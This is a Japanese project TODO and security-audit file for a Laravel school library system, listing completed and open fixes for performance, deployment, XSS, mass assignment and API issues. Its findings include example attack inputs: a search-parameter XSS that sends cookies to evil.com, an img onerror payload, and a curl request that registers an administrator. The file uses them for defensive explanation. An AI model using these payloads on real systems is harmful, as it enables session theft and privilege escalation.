# TODO - 学校図書管理システム

## 完了済み

### ~~1. 登録ボタンが見えない~~ ✅
- Tailwind CDNがViteビルド済みCSSを上書きしていたのが原因
- CDNスクリプト削除で解決

### ~~2. 「安全ではありません」画面が表示される~~ ✅
- AppServiceProviderで `URL::forceScheme('https')` を追加

### ~~3. 書籍の重複登録の対応~~ ✅
- `copy_number`カラムを追加（ISBN+copy_numberの複合ユニーク）
- 同じISBNで登録すると自動的に冊番号が採番される

### ~~4. Tailwindカスタムカラーが本番で効かない~~ ✅
- CDN削除 + 不要な@tailwindcss/vite v4パッケージ削除で解決

### ~~5. 学校向け導入提案資料~~ ✅
- `docs/school-proposal.md` に費用詳細込みで作成

### ~~6. 管理者セットアップ手順~~ ✅
- `docs/admin-setup.md` に作成

### ~~7. カスタム確認モーダル~~ ✅
- ブラウザ標準のconfirm()をAlpine.jsカスタムモーダルに置換（3箇所）

### ~~8. フッター追加~~ ✅
- レイアウトにフッター追加（書籍一覧・マイページ・利用規約・プライバシーポリシーへのリンク）

### ~~9. カスタムエラーページ~~ ✅
- 403（アクセス禁止）、404（ページ不明）、500（サーバーエラー）を作成

### ~~10. 利用規約・プライバシーポリシー~~ ✅
- `/terms`、`/privacy` ページを作成
- 登録ページに同意文言を追加

### ~~11. locale修正~~ ✅
- `config/app.php` のlocaleを `ja` に変更

### ~~12. セキュリティチェック~~ ✅
- 管理者権限: バックエンド（AdminMiddleware）で保護済み
- パスワード: POST送信 + CSRF保護
- APP_DEBUG=false 設定済み
- Cookie: HttpOnly, SameSite=Lax

### ~~16. 後輩への引き継ぎ資料作成~~ ✅
- `docs/handover.md` に作成
- 開発環境構築、アーキテクチャ、コード規約、デプロイ手順、トラブルシューティングを網羅

---

## 未完了（既存）

### 13. アプリ名・ロゴの変更
- 現在の「本見れたり、借りれたり」から変更を検討中
- 名前が決まったらロゴ→ファビコンの順で対応
- Renderの `APP_NAME` 環境変数も更新する

### 14. カスタムドメインの設定
- Cloudflareで取得済みのドメインをRenderに紐付け
- DNS設定（CNAME）+ SSL証明書（Render自動発行）
- Render無料プランでも設定可能

### 15. Renderスリープ防止
- 学校側にRender有料プラン（$7/月）を提案
- 承認されない場合はUptimeRobot（無料）で対応

### 17. デザイン改善（将来）
- 検索セクションのレイアウト調整
- カードデザインの改善
- ヘッダーロゴの刷新（アプリ名変更後）
- 全体的なビジュアル向上

### 18. ヘッダーの現在ページインジケーターの色を管理者ナビと統一する
- ヘッダーナビの現在ページインジケーター（アクティブバー）の色を、管理者ナビと揃える

### 20. 書籍詳細の貸出状況セクションの表示を修正する
- PC幅でも「貸出中（あなた）」テキストと「マイページで返却する」ボタンが大きすぎる
- 絵文字アイコン・ステータステキスト・貸出ボタンのサイズを全体的に縮小する
- スマホ幅でもPC幅でも適切なサイズになるよう調整する

### 19. パスワードの表示/非表示切り替え機能
- UI: パスワード入力フィールドの横にトグルボタン（例: 目アイコン）を追加
- JavaScript: トグルボタンクリック時に `type` 属性を "password" / "text" で切り替える
- UX: トグルアイコンを現在の状態に合わせて変更

---

## 未完了（2026-02-16 監査で発見）

> 以下は2026年2月16日のプロジェクト全体監査で発見された問題です。
> 優先度順に記載しています。各セッションで1つずつ対応してください。

---

### 🔴 ~~CRITICAL（本番運用の前提条件）~~ ✅

---

### ~~C-1. 本番サーバーを Nginx + PHP-FPM に切り替える~~ ✅

**何が問題か：**
Render.ioにデプロイされるルートの `Dockerfile` が `php artisan serve` を使っている。
これはLaravel付属の**シングルスレッド開発用サーバー**で、リクエストを1件ずつしか処理できない。
生徒3人が同時にアクセスしただけで、2人は前の処理が終わるまで待たされる。

**なぜ危険か：**
- 同時アクセスでレスポンスが極端に遅くなる・タイムアウトする
- 長時間のリクエスト（ISBN検索など）が入ると全ユーザーがブロックされる
- 本番で使うことを想定していないサーバーなのでクラッシュする可能性がある

**現状：**
- `laravel-app/Dockerfile` には正しいNginx + PHP-FPM + Supervisor構成がすでにある
- `laravel-app/docker/` 以下にnginx設定、supervisor設定、起動スクリプトも揃っている
- しかしRenderデプロイで使われるルートの `Dockerfile` がこれらを使っていない

**該当ファイル：**
- `/Dockerfile`（ルート） — `php artisan serve` で起動している（22行目）
- `/laravel-app/docker/render-start.sh` — 起動スクリプト（22行目）
- `/render.yaml` — Renderデプロイ設定

**参考にすべきファイル（正しい構成がすでにある）：**
- `/laravel-app/Dockerfile` — Nginx + PHP-FPM + Supervisorのマルチステージビルド
- `/laravel-app/docker/start.sh` — Supervisor起動スクリプト
- `/laravel-app/docker/nginx/default.conf` — Nginx設定
- `/laravel-app/docker/nginx/nginx.conf` — Nginx基本設定
- `/laravel-app/docker/supervisor/supervisord.conf` — Supervisor設定
- `/laravel-app/docker/php/php.ini` — PHP設定
- `/laravel-app/docker/php/opcache.ini` — OPcache設定

**修正方針：**
ルートの `Dockerfile` を `laravel-app/Dockerfile` の構成をベースに書き換える。
ただしRenderの制約に対応する必要がある：
- Renderはポートを環境変数 `$PORT` で動的に割り当てるため、Nginxが `$PORT` でlistenするようにする
- `render-start.sh` を `start.sh` と同様にSupervisorで起動するように変更する
- Nginxの `default.conf` を `envsubst` でポート番号を差し替えるテンプレートにする

**注意点：**
- `php.ini` の `session.save_handler = redis` はRender環境ではRedisがないため、
  Render用に `session.save_handler = files` に上書きするか、環境変数で制御する必要がある
- Render無料プランではメモリ512MBの制限があるため、PHP-FPMのワーカー数を抑える

---

### ~~C-2. データベースにインデックスを追加する~~ ✅

**何が問題か：**
`loans` テーブルの `user_id`、`book_id`、`status`、`due_date`、`returned_at` にインデックスがない。
`books` テーブルの `title`、`author` にもインデックスがない。
全てのクエリがテーブル全件を走査（フルテーブルスキャン）している。

**なぜ危険か：**
- 蔵書100冊でも貸出一覧の表示が遅くなる
- 蔵書1000冊超でページ表示がタイムアウトする可能性がある
- 検索機能が実用的な速度で動かなくなる

**該当ファイル：**
- `database/migrations/2025_07_22_134932_create_loans_table.php` — インデックス定義なし
- `database/migrations/2025_07_11_062438_create_books_table.php` — title, authorにインデックスなし

**インデックスが必要なクエリの例：**
```php
// app/Http/Controllers/LoanController.php:39-41
Loan::where('book_id', $request->book_id)
    ->where('status', Loan::STATUS_BORROWED)->first();

// app/Http/Controllers/BookController.php:25-31
$query->where('title', 'like', "%{$escaped}%")
      ->orWhere('author', 'like', "%{$escaped}%");

// app/Console/Commands/CheckOverdueLoans.php
Loan::where('status', Loan::STATUS_BORROWED)
    ->where('due_date', '<', now()->startOfDay());
```

**修正方針：**
新しいマイグレーションを1つ作成し、以下のインデックスを追加する：
```php
// loans テーブル
$table->index('user_id');
$table->index('book_id');
$table->index('status');
$table->index('due_date');
$table->index('returned_at');
$table->index(['book_id', 'status']); // 貸出可否チェック用の複合インデックス

// books テーブル
$table->index('title');
$table->index('author');
$table->index('created_at');
```

**備考：**
- `user_id` と `book_id` は `foreignId()->constrained()` で作成されているが、
  Laravelは外部キー制約を追加するだけで、インデックスを自動作成するかはDBエンジンに依存する。
  明示的にインデックスを追加するのが安全。
- PostgreSQL（Neon）では外部キーにインデックスが自動作成されないため特に重要。

---

### ~~C-3. N+1クエリ問題を修正する~~ ✅

**何が問題か：**
`Book` モデルの `getDisplayTitleAttribute()` が呼ばれるたびに、同じISBNの冊数を数える
SQLクエリが発行されている。書籍一覧で20冊表示すると、1回のページ表示で**21回のDBクエリ**が実行される。

**なぜ危険か：**
- ページ表示のたびに不必要なDB負荷がかかる
- 書籍数が増えるほど線形に遅くなる
- 蔵書が増えたときに最初に顕在化するパフォーマンス問題

**該当ファイル：**
- `app/Models/Book.php` — `getDisplayTitleAttribute()` メソッド内

**現在のコード（問題）：**
```php
public function getDisplayTitleAttribute(): string
{
    // ← 毎回DBクエリが発行される
    $totalCopies = static::where('isbn', $this->isbn)->count();
    if ($totalCopies > 1) {
        return "{$this->title} [冊{$this->copy_number}]";
    }
    return $this->title;
}
```

**修正方針：**

**案A（シンプル）：** copy_numberが1より大きい場合のみ冊番号を表示する
```php
public function getDisplayTitleAttribute(): string
{
    if ($this->copy_number > 1) {
        return "{$this->title} [冊{$this->copy_number}]";
    }
    return $this->title;
}
```
- メリット：追加クエリゼロ、シンプル
- デメリット：1冊目（copy_number=1）は常に冊番号なし表示になる
  （ただし、2冊目以降は「[冊2]」と表示されるので文脈上問題ない）

---

### ~~C-4. データベースバックアップ戦略を策定する~~ ✅

**何が問題か：**
自動バックアップが一切設定されていない。DBが壊れた場合、全データが失われる。

**なぜ危険か：**
- サーバー障害、誤操作、マイグレーション失敗でデータが消失する
- 蔵書データ、貸出履歴、ユーザーアカウントが全て消える
- 復旧不可能

**現状：**
- 本番DB: Neon PostgreSQL（Render環境変数で接続）
- ローカルDB: Docker MySQL（`mysql_data/` ディレクトリ）
- バックアップ設定: なし
- リストア手順: なし

**修正方針：**
Neon PostgreSQL を使っているため、Neonの機能を活用する：
- Neonは自動的にポイントインタイムリカバリを提供している（無料プランでも7日間）
- これを確認・文書化するだけでも最低限のバックアップになる
- 追加で、定期的な `pg_dump` をスケジュール実行する仕組みを検討

**対応内容：**
1. Neonのバックアップ設定を確認し、文書化する
2. 手動バックアップの手順を `docs/` に記載する
3. 可能であれば `pg_dump` の定期実行を設定する

---

### ~~C-5. デプロイ先の矛盾を解消する~~ ✅

**何が問題か：**
CI/CDパイプライン（GitHub Actions）がEC2へのSSHデプロイを設定しているが、
実際のインフラは Render.io を使っている。どちらが本番か不明。

**なぜ危険か：**
- CIが成功しても正しい場所にデプロイされない可能性がある
- 2つの異なるインフラを管理するコストが発生する
- 障害時にどちらを調べればいいかわからない

**該当ファイル：**
- `.github/workflows/ci.yml` — EC2への SSH デプロイが設定されている
- `/render.yaml` — Render.ioへのデプロイが設定されている

**修正方針：**
Renderを本番環境として統一する（`render.yaml` と `CLAUDE.md` の記載と一致）：
1. `.github/workflows/ci.yml` からEC2デプロイステージを削除する
2. Renderは `main` ブランチへのpushで自動デプロイするため、CIはテスト実行のみに絞る
3. CIの役割を明確にする：「テスト → パス → mainにマージ → Renderが自動デプロイ」

---

### ~~C-6. 管理画面のテストを追加する~~ ✅

**何が問題か：**
管理者ダッシュボード、ユーザー権限変更、書籍編集・削除、延滞管理、強制返却など、
管理画面の機能が**すべてテストなし**。

**なぜ危険か：**
- コード変更で管理機能が壊れても気づけない
- 権限チェックのバグ（一般ユーザーが管理機能にアクセスできる等）を検出できない
- CIが通っても管理画面が動かない可能性がある

**現状のテストカバレッジ：**
```
管理画面:         0/12 エンドポイント（0%）
BookController:   5/9 メソッド（56%）— edit, update, destroy が未テスト
LoanController:   3/6 メソッド（50%）— index, forceReturn, overdue が未テスト
Admin\*:          0/4 メソッド（0%）— 全て未テスト
全体:             11/24 メソッド（46%）
```

**テストが必要なエンドポイント：**
```
# Admin系（認可テスト含む）
GET    /admin/dashboard           — ダッシュボード統計の正確性
GET    /admin/books               — 管理者書籍一覧
GET    /admin/users               — ユーザー一覧
PATCH  /admin/users/{user}/role   — 権限変更（自分自身は変更不可の検証含む）

# Book CRUD（未テスト分）
GET    /books/{book}/edit         — 編集フォーム表示
PUT    /books/{book}              — 書籍更新
DELETE /books/{book}              — 書籍削除（貸出中は削除不可の検証含む）

# Loan管理（未テスト分）
GET    /loans                     — 全貸出一覧
GET    /loans/overdue             — 延滞一覧
POST   /loans/{loan}/force-return — 強制返却

# 認可テスト（一般ユーザーがアクセスできないことの確認）
GET    /admin/dashboard as USER   — 403が返ること
POST   /books as USER             — 403が返ること
PATCH  /admin/users/1/role as USER — 403が返ること
```

**該当ファイル：**
- `tests/Feature/BookManagementTest.php` — edit/update/destroyのテスト追加
- `tests/Feature/LoanManagementTest.php` — admin系テスト追加
- 新規: `tests/Feature/AdminDashboardTest.php`
- 新規: `tests/Feature/AdminUserManagementTest.php`
- 新規: `tests/Feature/AuthorizationTest.php`（認可テスト）

**テストと実装の不整合にも注意：**
- `tests/Feature/BookManagementTest.php` にISBN重複テストがあるが、
  実際のコードは複本として正常登録する。テストの期待値が間違っている可能性がある。

---

### 🟠 HIGH（重大だが即座に障害にはならない）

---

### ~~H-1. 延滞チェックの自動実行を設定する~~ ✅

**何が問題か：**
`CheckOverdueLoans` コマンドは存在するが、Laravelスケジューラに登録されていない。
手動で `php artisan loans:check-overdue` を実行しない限り、延滞ステータスが更新されない。

**影響：**
- 返却期限を過ぎても「貸出中」のまま表示され続ける
- 延滞一覧に本が表示されない
- 管理者が延滞状況を正確に把握できない

**該当ファイル：**
- `app/Console/Commands/CheckOverdueLoans.php` — コマンド自体は実装済み
- `routes/console.php` または `app/Console/Kernel.php` — スケジュール登録が必要

**修正方針：**
Laravel 12では `routes/console.php` にスケジュールを登録する：
```php
use Illuminate\Support\Facades\Schedule;
Schedule::command('loans:check-overdue')->dailyAt('06:00');
```
Render環境ではcronが使えないため、代替手段を検討：
- Render Cron Job（有料）を使う
- または、ユーザーアクセス時にチェックするミドルウェアを作る

---

### ~~H-2. ソフトデリートを実装する~~ ✅

**何が問題か：**
`Book` モデルに `SoftDeletes` が実装されていない。
書籍を削除すると物理削除され、関連する貸出記録もCASCADE DELETEで連鎖削除される。

**影響：**
- 誤って書籍を削除すると復元不可能
- 貸出履歴が完全に消失する（「誰がいつ何を借りたか」の記録が消える）
- 管理者が間違えて削除ボタンを押しただけでデータ喪失

**該当ファイル：**
- `app/Models/Book.php` — `SoftDeletes` トレイト未使用
- `database/migrations/2025_07_11_062438_create_books_table.php` — `softDeletes()` カラムなし
- `database/migrations/2025_07_22_134932_create_loans_table.php` — `onDelete('cascade')` が設定済み

**修正方針：**
1. 新しいマイグレーションで `books` テーブルに `deleted_at` カラムを追加
2. `Book` モデルに `use SoftDeletes;` を追加
3. `loans` テーブルの外部キーを `onDelete('cascade')` → `onDelete('restrict')` に変更
   （貸出中の書籍は削除不可にする）
4. BookController の `destroy` メソッドを確認し、ソフトデリート対応にする

---

### ~~H-3. 貸出の競合状態（Race Condition）を防ぐ~~ ✅

**何が問題か：**
2人のユーザーが同時に同じ本を借りようとした場合、両方のリクエストが
「この本は貸出可能」と判定し、二重貸出が発生する可能性がある。

**該当コード：**
```php
// app/Http/Controllers/LoanController.php:39-41
$existingLoan = Loan::where('book_id', $request->book_id)
    ->where('status', Loan::STATUS_BORROWED)
    ->first();

if ($existingLoan) {
    return redirect()->route('books.index')->with('error', 'この本は既に貸出中です');
}
// ← ここで別のリクエストが割り込む可能性がある
$loan = Loan::create([...]);
```

**修正方針（2つの選択肢）：**

**案A（シンプル）：** データベースにユニーク制約を追加
```php
// 新しいマイグレーション
$table->unique(['book_id', 'status'], 'loans_active_borrow_unique')
    ->where('status', 1); // PostgreSQLの部分インデックス
```

**案B（トランザクション）：** 貸出処理をトランザクション + 排他ロックで囲む
```php
DB::transaction(function () use ($request) {
    $existingLoan = Loan::where('book_id', $request->book_id)
        ->where('status', Loan::STATUS_BORROWED)
        ->lockForUpdate()
        ->first();
    // ...
});
```

---

### H-4. セッション暗号化を有効にする

**何が問題か：**
`.env` で `SESSION_ENCRYPT=false` が設定されている。
セッションドライバが `database` のため、セッションデータがDB内に平文で保存されている。

**影響：**
- DBが侵害された場合、全ユーザーのセッション情報が読まれる

**修正方針：**
本番環境の環境変数（Render）で `SESSION_ENCRYPT=true` を設定する。
ローカル開発環境は `false` のままでも問題ない。

---

### H-5. パスワードリセット機能を有効化する

**何が問題か：**
`routes/auth.php` でパスワードリセット関連のルートがコメントアウトされている。
ユーザーがパスワードを忘れた場合、復旧手段がない。

**該当ファイル：**
- `routes/auth.php` — パスワードリセットルートがコメントアウト

**修正方針：**
1. メール送信環境（SMTP等）をRenderに設定する
2. パスワードリセットルートのコメントアウトを解除する
3. テスト用のメールサービス（Mailtrap等）で動作確認する

**備考：**
学校運用では管理者が直接リセットする運用も考えられるため、
メール環境構築が難しい場合は、管理者画面にパスワードリセット機能を追加する方法もある。

---

### ~~H-6. Redis設定の不整合を解消する~~ ✅

**何が問題か：**
Docker構成にRedisコンテナが含まれているが、Render本番環境ではRedisが存在しない。
`php.ini` の `session.save_handler = redis` がRender環境ではエラーになる可能性がある。

**該当ファイル：**
- `docker/php/php.ini` — `session.save_handler = redis` （18行目）
- `render.yaml` — `SESSION_DRIVER=database`, `CACHE_STORE=database`

**修正方針：**
`php.ini` のセッションハンドラ設定を環境変数で上書きできるようにする。
または、`render.yaml` と `php.ini` の設定を統一する（databaseに統一）。

---

### ~~🟡 MEDIUM（改善すべきだが緊急ではない）~~ ✅

---

### ~~M-1. セキュリティヘッダーをアプリケーションレベルで追加する~~ ✅
- `SecurityHeadersMiddleware` を作成しグローバル登録（二重防御）
- NginxのCSPにも `'unsafe-eval'` を追加（Alpine.js対応）

### ~~M-2. 監査ログ（誰が何をしたか）を記録する~~ ✅
- `audit_logs` テーブル + `AuditLog` モデルを作成
- 書籍登録・編集・削除、貸出・返却・強制返却、権限変更に監査ログを追加

### ~~M-3. XMLパース時のXXE対策を追加する~~ ✅
- `simplexml_load_string()` に `LIBXML_NONET` フラグを追加

### ~~M-4. ストレージ権限を修正する~~ ✅
- ルートDockerfile: C-1修正時に775に変更済み
- `laravel-app/Dockerfile`: 755→775に修正

### ~~M-5. テストと実装の不整合を修正する~~ ✅
- 確認の結果、テスト（94-108行目）は複本登録を正しく検証しており対応済み

---

### 🔵 LOW（余裕があれば対応）

---

### L-1. `mysql_data/` ディレクトリがワーキングディレクトリに存在する

**何が問題か：**
Docker MySQLのデータディレクトリ（106MB）がプロジェクトルートに残っている。
`.gitignore` に含まれているためgitには入らないが、ディスクを圧迫し紛らわしい。

**修正方針：**
`docker-compose.yml` のボリュームマウント先を変更するか、`.dockerignore` に追加する。

---

### L-2. データ型の型安全性を向上させる

**何が問題か：**
`role`（1=admin, 2=user）と `status`（1=借出, 2=返却, 3=延滞）が `tinyInteger` で定義されている。
不正な値（0, 4, 99等）が入っても制約違反にならない。

**修正方針：**
LaravelのEnum castを使って型安全にする（将来的な改善）。

---

### L-3. E2E/ブラウザテストの導入を検討する

**何が問題か：**
JavaScriptの動作（Alpine.js連携、モーダル、ISBN検索フォーム等）を
テストする手段がない。

**修正方針：**
Laravel DuskまたはPlaywrightの導入を検討する（将来的な改善）。

---
---

## 未完了（2026-02-16 第2回監査で発見）

> 以下は2026年2月16日の**第2回プロジェクト監査**（実用性の徹底調査）で発見された問題です。
> 第1回監査で発見・対処済みの項目（SoftDeletes、排他ロック、インデックス等）とは重複しません。
>
> ### セッション分けの推奨
> 各修正は影響範囲が異なるため、**1セッション = 1ブランチ = 1つのテーマ**で対応することを推奨します。
>
> | セッション | ブランチ名 | 対象 | 所要時間目安 |
> |---|---|---|---|
> | 1 | `fix/xss-vulnerabilities` | S-1, S-2 | 30分 |
> | 2 | `fix/mass-assignment` | S-3 | 15分 |
> | 3 | `fix/soft-delete-validation` | S-4 | 15分 |
> | 4 | `fix/api-security` | S-5, S-6 | 30分 |
> | 5 | `fix/loan-integrity` | S-7, S-8 | 30分 |
> | 6 | `fix/security-headers` | S-9, S-10, S-14 | 30分 |
> | 7 | `fix/pagination` | S-11 | 30分 |
> | 8 | `fix/registration-control` | S-12 | 30分 |
> | 9 | `fix/copy-number-race` | S-13 | 20分 |
> | 10 | `chore/unused-deps` | S-15 | 10分 |

---

### 🔴 CRITICAL（本番運用の前提条件）

---

### ~~S-1. XSS脆弱性: 書籍検索のユーザー入力がJavaScriptに直接挿入される~~ ✅

**何が問題か：**
`books/index.blade.php` の157行目で、ユーザーの検索クエリ（URLの `?search=` パラメータ）が
JavaScriptの文字列リテラルにエスケープなしで埋め込まれている。

**現在のコード（危険）：**
```javascript
// resources/views/books/index.blade.php:157
searchQuery: '{{ request('search') }}' || '',
```

**なぜ危険か：**
`{{ }}` はHTMLのエスケープ（`<` → `&lt;` 等）しか行わない。
JavaScriptの文字列コンテキストでは `'`（シングルクォート）が「文字列の終わり」を意味するため、
以下の入力でJavaScriptコードを注入できる：

```
?search='; document.location='https://evil.com/steal?cookie='+document.cookie; '
```

これにより：
- 攻撃者がこのURLを他のユーザーに送る → ユーザーがクリック → Cookieが盗まれる
- ログインセッションの乗っ取りが可能

**重要な補足（「エスケープ」とは何か）：**
エスケープとは「特別な意味を持つ文字を、ただの文字として扱わせる処理」のこと。
`'` はJavaScriptでは「文字列の終わり」という特別な意味を持つので、
`\'` に変換して「ただのアポストロフィ」として扱わせる必要がある。
ただし、エスケープの方法は **埋め込む先のコンテキスト（HTML/JavaScript/SQL/URL）によって異なる**。
LaravelのBlade `{{ }}` はHTML用のエスケープであり、JavaScript用ではない。

**修正方針：**
Laravelの `@json()` ディレクティブを使う。これはJavaScriptに安全に値を埋め込むための仕組み：

```javascript
// 修正後（安全）
searchQuery: @json(request('search', '')) || '',
```

`@json()` は値をJSON形式でエンコードするため、`'` や `"` や改行などの
JavaScript上で特別な意味を持つ文字が全て安全にエスケープされる。

**該当ファイル：**
- `resources/views/books/index.blade.php` — 157行目

---

### ~~S-2. XSS脆弱性: ISBNスキャン画面でユーザー入力がHTMLとして解釈される~~ ✅

**何が問題か：**
`isbn-scan.blade.php` で2箇所、ユーザー入力を `innerHTML` でDOM に挿入している。
`innerHTML` は文字列をHTMLとして解釈するため、スクリプトの注入が可能。

**現在のコード（危険）：**
```javascript
// isbn-scan.blade.php:196 — バーコードスキャン結果の表示
document.getElementById('result').innerHTML = '<p>ISBN検出: ' + decodedText + '</p>';

// isbn-scan.blade.php:351 — エラーメッセージの表示
errorText.innerHTML = message;
```

**なぜ危険か：**
196行目：バーコードスキャナーから読み取った値が、チェックをすり抜けた場合にHTMLとして挿入される。
351行目：`getDetailedErrorMessage()` 関数がHTML（`<ul><li>` 等）を含むエラーメッセージを生成し、
その中にユーザー入力（ISBN）が `${isbn}` で直接埋め込まれている。

```javascript
// getDetailedErrorMessage内 — isbn がHTMLとして解釈される
return `ISBN「${isbn}」の書籍情報が見つかりませんでした...
        <ul class="mt-2 ml-4 list-disc text-sm">
            <li>ISBNが正しく入力されているか</li>
        </ul>`;
```

ISBN入力欄に `<img src=x onerror=alert(document.cookie)>` と入力すると、
エラー表示時にスクリプトが実行される。

**重要な補足（なぜエラーメッセージにHTMLが含まれるのか）：**
開発者が「箇条書きリストで分かりやすくエラーを表示したい」という見た目上の理由で
エラーメッセージにHTMLタグを含めた。これ自体は一般的な要望だが、
**HTMLテンプレート（固定）とユーザー入力（可変）を同じ文字列で混ぜた**のが問題。

**修正方針：**
196行目は `textContent` に変更する：
```javascript
document.getElementById('result').textContent = 'ISBN検出: ' + decodedText;
```

351行目はHTMLテンプレートとユーザー入力を分離する：
```javascript
function showError(message, userInput) {
    const errorDiv = document.getElementById('error-message');
    const errorText = document.getElementById('error-text');
    // ユーザー入力は textContent で安全に挿入
    errorText.textContent = '';
    if (userInput) {
        const span = document.createElement('span');
        span.textContent = userInput;
        errorText.appendChild(span);
    }
    // 固定HTMLは別の要素に innerHTML で挿入（ユーザー入力を含まない）
    const details = document.createElement('div');
    details.innerHTML = message; // message にはユーザー入力を含めない
    errorText.appendChild(details);
    errorDiv.classList.remove('hidden');
}
```

**該当ファイル：**
- `resources/views/isbn-scan.blade.php` — 196行目、351行目、390-410行目

---

### ~~S-3. Mass Assignment脆弱性: 誰でも管理者として登録可能~~ ✅

**何が問題か：**
`User` モデルの `$fillable` に `role` が含まれている。
Laravelの `$fillable` に含まれたカラムは、リクエストデータから一括代入（mass assignment）できる。
ユーザー登録時にリクエストに `role=1` を追加送信するだけで、管理者アカウントが作成できる。

**現在のコード（危険）：**
```php
// app/Models/User.php:20-25
protected $fillable = [
    'name',
    'email',
    'password',
    'role',    // ← これが問題
];
```

**なぜ危険か：**
ブラウザの開発者ツールで登録フォームに以下を追加するだけで管理者になれる：
```html
<input type="hidden" name="role" value="1">
```
または `curl` で直接POSTリクエストを送信：
```bash
curl -X POST https://example.com/register \
  -d "name=Hacker&email=hacker@test.com&password=password&password_confirmation=password&role=1"
```

管理者になると：書籍の追加・編集・削除、全ユーザーの権限変更、全貸出記録の閲覧・操作が可能。

**重要な補足（Mass Assignmentとは何か）：**
Laravelでは `User::create($request->all())` のように、リクエストデータを一括でモデルに渡せる。
`$fillable` に含まれるカラムだけが代入される仕組みだが、
`role` を `$fillable` に入れてしまうと、攻撃者がリクエストに `role` を追加するだけで値を設定できる。

**修正方針：**
`role` を `$fillable` から削除し、管理者権限の変更は明示的な代入のみにする：

```php
// app/Models/User.php — 修正後
protected $fillable = [
    'name',
    'email',
    'password',
    // role は意図的に除外（mass assignmentを防ぐ）
];
```

`Admin\UserController::toggleRole()` は `$user->update(['role' => ...])` を使っているが、
`role` が `$fillable` から外れると `update()` で更新できなくなる。
代わりに直接代入を使う：

```php
// Admin/UserController.php — 修正後
$user->role = $user->isAdmin() ? User::ROLE_USER : User::ROLE_ADMIN;
$user->save();
```

**該当ファイル：**
- `app/Models/User.php` — `$fillable` 配列（20行目）
- `app/Http/Controllers/Admin/UserController.php` — `toggleRole()` メソッド（29行目）

---

### ~~S-4. ソフトデリート済みの書籍が貸出可能~~ ✅

**何が問題か：**
`LoanController::borrow()` のバリデーション `exists:books,id` は
データベースに直接SQLを発行するため、SoftDeletesのグローバルスコープ（`deleted_at IS NULL`）が適用されない。
削除済み書籍のIDを指定すればバリデーションを通過し、貸出レコードが作成される。

**現在のコード（問題）：**
```php
// app/Http/Controllers/LoanController.php:36-38
$request->validate([
    'book_id' => 'required|exists:books,id'
    // ↑ SQLは SELECT count(*) FROM books WHERE id = ?
    //   deleted_at の条件がない！
]);
```

**なぜ危険か：**
- 管理者が書籍を削除した後も、そのIDを知っていれば貸出できてしまう
- IDは連番なので推測も容易（1, 2, 3...と試す）
- 「存在しない本が貸出中」という矛盾したデータが生まれ、管理画面が混乱する

**重要な補足（なぜIDが推測できるのか）：**
- 書籍のURLが `/books/5` のようにIDがそのまま見える
- IDは自動採番（1, 2, 3...）なので歯抜けを探せば削除済みがわかる
- 貸出フォームの `<input type="hidden" name="book_id" value="4">` を開発者ツールで書き換え可能

**修正方針：**
`exists` ルールに `deleted_at IS NULL` 条件を追加する：

```php
use Illuminate\Validation\Rule;

$request->validate([
    'book_id' => [
        'required',
        Rule::exists('books', 'id')->whereNull('deleted_at'),
    ],
]);
```

**該当ファイル：**
- `app/Http/Controllers/LoanController.php` — `borrow()` メソッド（36行目）

---

### ~~S-5. APIエラーレスポンスがサーバー内部情報を漏洩する~~ ✅

**何が問題か：**
`/api/book/info/{isbn}` エンドポイントで例外が発生した場合、
`$e->getMessage()` の内容がそのままJSONレスポンスに含まれる。
例外メッセージにはファイルパス、DB接続情報、PHPの内部エラー等が含まれる場合がある。

**現在のコード（危険）：**
```php
// routes/api.php:44-48
} catch (\Exception $e) {
    return response()->json([
        'success' => false,
        'error' => 'サーバーエラーが発生しました: ' . $e->getMessage()
        //                                         ↑ 内部情報が漏洩
    ], 500);
}
```

**なぜ危険か：**
例えば以下のような情報が漏れる可能性がある：
- `SQLSTATE[HY000]: Connection refused (Connection refused) at /var/www/vendor/...`
- `file_get_contents(/var/www/storage/...): failed to open stream`
- DB接続先のホスト名やポート番号

これらの情報は攻撃者にサーバー構成を把握させ、次の攻撃の足がかりになる。

**修正方針：**
ユーザー向けには固定メッセージを返し、詳細はログに記録する：

```php
} catch (\Exception $e) {
    Log::error("ISBN API Error: " . $e->getMessage());
    return response()->json([
        'success' => false,
        'error' => 'サーバーエラーが発生しました。しばらくしてから再度お試しください。'
    ], 500);
}
```

**該当ファイル：**
- `routes/api.php` — 44-48行目

---

### 🟠 HIGH（重大だが即座に障害にはならない）

---

### S-6. ISBN API にレート制限がない

**何が問題か：**
`/api/book/info/{isbn}` エンドポイントに認証もレート制限もない。
誰でも無制限にリクエストを送信でき、外部API（openBD、NDL）への大量リクエストの踏み台になる。

**なぜ危険か：**
- 攻撃者がスクリプトで毎秒100リクエストを送信 → openBD/NDLのAPIに大量アクセス
- 外部APIからIPブロックされる可能性 → 正規ユーザーのISBN検索が使えなくなる
- サーバーリソース（CPU、メモリ）を消費し、他の機能に影響

**現状：**
ログイン機能にはLaravel Breezeのレート制限（5回/分）が適用されているが、
ISBN APIは `routes/api.php` に定義されており、`throttle` ミドルウェアが適用されていない。

**修正方針：**
`throttle` ミドルウェアを追加する：

```php
// routes/api.php
Route::middleware('throttle:30,1')->get('/book/info/{isbn}', function (...) {
    // 1分あたり30回まで
});
```

**該当ファイル：**
- `routes/api.php` — ISBNルート定義

---

### S-7. 返却処理で「既に返却済み」チェックがない

**何が問題か：**
`LoanController::returnBook()` はユーザー所有権のチェックはあるが、
貸出が既に返却済みかどうかのチェックがない。同じ貸出を複数回「返却」でき、
`returned_at` のタイムスタンプが上書きされる。

**現在のコード（問題）：**
```php
// app/Http/Controllers/LoanController.php:67-83
public function returnBook(Loan $loan)
{
    if ($loan->user_id !== auth()->id()) {
        return redirect()->route('loans.my')->with('error', '他人の貸出記録は操作できません');
    }
    // ← ここに「既に返却済みか」のチェックがない
    $loan->update([
        'returned_at' => now(),    // 何度でも上書きされる
        'status' => Loan::STATUS_RETURNED
    ]);
    // ...
}
```

**なぜ問題か：**
- 正確な返却日時が失われる（後から上書きされるため）
- 監査ログに「同じ本を2回返却した」という不整合な記録が残る
- `forceReturn()` には `if ($loan->returned_at)` チェックがあるのに `returnBook()` にはない — 一貫性がない

**修正方針：**
所有権チェックの後に返却済みチェックを追加する：

```php
public function returnBook(Loan $loan)
{
    if ($loan->user_id !== auth()->id()) {
        return redirect()->route('loans.my')->with('error', '他人の貸出記録は操作できません');
    }

    if ($loan->returned_at) {
        return redirect()->route('loans.my')->with('error', 'この貸出は既に返却済みです');
    }

    $loan->update([...]);
}
```

**該当ファイル：**
- `app/Http/Controllers/LoanController.php` — `returnBook()` メソッド（67行目）

---

